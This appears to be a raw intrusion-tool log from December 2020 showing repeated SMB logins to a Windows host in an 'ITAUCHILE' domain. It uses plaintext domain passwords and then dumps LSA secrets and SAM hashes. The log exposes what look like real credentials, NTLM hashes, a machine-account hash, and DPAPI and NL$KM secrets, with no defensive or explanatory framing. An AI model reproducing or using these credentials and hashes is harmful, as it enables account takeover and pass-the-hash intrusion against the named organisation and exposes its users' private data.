12-22-2020 18:49:59 [*] PRODVIRTUAL071.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL071) (domain:ITAUCHILE)
12-22-2020 18:49:59 [+] PRODVIRTUAL071.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:50:11 [*] PRODVIRTUAL071.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL071) (domain:ITAUCHILE)
12-22-2020 18:50:11 [+] PRODVIRTUAL071.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:50:17 [+] PRODVIRTUAL071.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 18:50:21 CRPA1580:cef48e1129a0d410a731e9396e6fc456:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:50:22 CRPA0820:066719777696bfd099b3fbf9b54fcafe:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:50:23 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:50:26 ITAUCHILE\PRODVIRTUAL071$:aad3b435b51404eeaad3b435b51404ee:464f427717d57ac6a1072c516b6ebf55:::
12-22-2020 18:50:28 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 18:50:30 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 18:56:10 [*] PRODVIRTUAL071.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL071) (domain:ITAUCHILE)
12-22-2020 18:56:10 [+] PRODVIRTUAL071.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:56:16 [+] PRODVIRTUAL071.ITAUCHILE.CL:445 Dumping SAM hashes (uid:rid:lmhash:nthash):
12-22-2020 18:56:20 eaglebkb:500:aad3b435b51404eeaad3b435b51404ee:5ebebeee51456bcfe7381dcd62683244:::
12-22-2020 18:56:22 Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
12-22-2020 18:56:24 lcladmin:1003:aad3b435b51404eeaad3b435b51404ee:640524c6ccc0a79f008484c0f78aaffa:::
12-22-2020 18:56:26 robotics:1004:aad3b435b51404eeaad3b435b51404ee:9657fa981a96471df865e11b9932983d:::
12-22-2020 18:59:01 [*] PRODVIRTUAL071.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL071) (domain:ITAUCHILE)
12-22-2020 18:59:01 [+] PRODVIRTUAL071.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:59:07 [+] PRODVIRTUAL071.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 18:59:12 CRPA1580:cef48e1129a0d410a731e9396e6fc456:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:59:13 CRPA0820:066719777696bfd099b3fbf9b54fcafe:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:59:14 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:59:16 ITAUCHILE\PRODVIRTUAL071$:aad3b435b51404eeaad3b435b51404ee:464f427717d57ac6a1072c516b6ebf55:::
12-22-2020 18:59:19 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 18:59:20 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 21:06:35 [*] PRODVIRTUAL071.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL071) (domain:ITAUCHILE)
12-22-2020 21:06:36 [+] PRODVIRTUAL071.ITAUCHILE.CL:445 Login successful ITAUCHILE\USR_ROBOTIC:Usr.ROBOT19*
12-22-2020 21:06:40 [+] PRODVIRTUAL071.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 21:06:45 CRPA1580:cef48e1129a0d410a731e9396e6fc456:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:06:46 CRPA0820:066719777696bfd099b3fbf9b54fcafe:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:06:47 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:06:50 ITAUCHILE\PRODVIRTUAL071$:aad3b435b51404eeaad3b435b51404ee:464f427717d57ac6a1072c516b6ebf55:::
12-22-2020 21:06:52 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 21:06:53 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
